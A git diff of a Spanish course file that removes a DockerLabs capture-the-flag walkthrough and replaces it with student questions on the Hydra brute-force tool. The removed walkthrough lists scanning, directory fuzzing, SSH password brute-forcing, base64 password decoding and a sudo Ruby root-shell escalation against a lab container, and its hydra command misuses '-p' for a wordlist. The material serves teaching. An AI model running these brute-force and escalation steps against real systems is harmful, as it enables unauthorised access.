@@ -1,115 +1,25 @@
-## DOCKERLABS
+![](hydra.jpg)
 
+## Ejercicio Individual en Clase.
 
+De manera individual responder de acuerdo al elemento de estudio en clase ( https://www.kolibers.com/blog/hydra-herramienta-de-fuerza-bruta.html)  las siguientes preguntas.
 
+1. ¿Qué es Hydra y para qué se utiliza principalmente en el ámbito de la seguridad informática?
 
-# Amor | Laboratorios
+2. Menciona al menos tres protocolos que soporta Hydra para realizar ataques de fuerza bruta.
 
-## Fácil
+3. ¿Cuál es la diferencia entre los parámetros -l y -L en Hydra?
 
-22/08/2024
+4. Explica el propósito del parámetro -P y da un ejemplo de su uso en un comando.
 
-Dockerlabs.es
+5. ¿Qué indica el parámetro -t en Hydra y por qué podría ser importante modificar su valor?
 
-## Escaneo
+6. ¿Cómo se puede utilizar Hydra para atacar formularios de inicio de sesión web? Describe brevemente el proceso.
 
-Lo primero que realizaremos será revisar nuestra interfaz de red con:
+7. ¿Qué significa el parámetro -f y en qué situaciones es recomendable usarlo?
 
-```bash
-ifconfig -a
-```
-para saber a qué segmento apuntaremos nuestros escaneos.
+8. ¿Por qué es importante identificar el mensaje de error al fallar un login cuando se ataca un formulario web con Hydra?
 
-Ya con el segmento en vista y la interfaz, realizaremos una consulta a la red con el siguiente comando:
+9. ¿Qué consideraciones éticas y legales se deben tener en cuenta antes de usar Hydra?
 
-```bash
-sudo netdiscover -i docker0 -r 172.17.0.0/24
-```
-
-Ya con la búsqueda en la red resulta, realizaremos una búsqueda con nmap (Network Mapper):
-
-```bash
-sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2
-```
-
-La búsqueda nos devuelve que hay dos puertos abiertos, el **22** y el **80**.
-
-Abrimos el navegador para revisar el servicio del puerto **80**.
-
-A la vista no se encuentra nada, así que realizamos un fuzzing para ver si encontrábamos algo, pero adelanto... sin éxito, no hay amor en el sitio web...
-
-```bash
-gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-```
-
-A esta altura el servicio web no nos dio el amor que buscábamos, pero sí nos quedamos con la pista de carlota y juan, así que intentaremos con Hydra por SSH con esos usuarios.
-
-## Conexión SSHHydra
-
-Ejecutamos el siguiente comando de hydra, el cual nos da una respuesta positiva al fin:
-
-```bash
-hydra -l carlota -p /home/kali/Desktop/rockyou.txt ssh://172.17.0.2
-```
-
-Realizamos la conexión SSH con los datos obtenidos:
-
-Navegamos a la siguiente ruta:
-
-```bash
-cd /carlota/Desktop/fotos/vacaciones
-```
-
-En donde encontrarás un archivo llamado `imagen.jpg`.
-
-Para descargarlo más fácil, levanto un servicio web con el comando:
-
-```bash
-python3 -m http.server
-```
-
-La imagen descargada es la siguiente:
-
-
-
-## Esteganografía
-
-Ya es sospechoso que solo exista una imagen entre las rutas, por lo cual decidimos realizar una consulta de esteganografía con:
-
-```bash
-steghide
-```
-
-Dentro del archivo secret.txt encontraremos el siguiente código:
-
-Realizamos una búsqueda para saber qué tipo de codificación es y nos da por resultado que es base64, así que realizamos una decodificación:
-
-```bash
-echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
-```
-
-Probamos la contraseña con la usuaria carlota, lo que nos devuelve que la contraseña no corresponde.
-
-Revisamos los otros usuarios y decidimos probar con la cuenta **oscar**:
-
-```bash
-su oscar
-```
-
-Con `sudo -l` vemos que tenemos acceso a la consola de **ruby** y la ejecutamos:
-
-```bash
-sudo /usr/bin/ruby -e 'exec "/bin/bash"'
-```
-
-Finalmente hacemos un:
-
-```bash
-whoami
-```
-
-# Taller Individual.
-
-1. Raelizar una investigación de cada una de las herramientas empleadas mediante un cuadro que explique su definición, funcionalidad y casos de uso.
-
-2. Explicar en detalle cada uno de los comandos empleados realizando un desglose del mismo y citando al menos tres alternativas ( si aplica) de variantes del comando.
+10. Da un ejemplo de un comando de Hydra para atacar un servicio SSH, indicando el significado de cada parámetro utilizado.
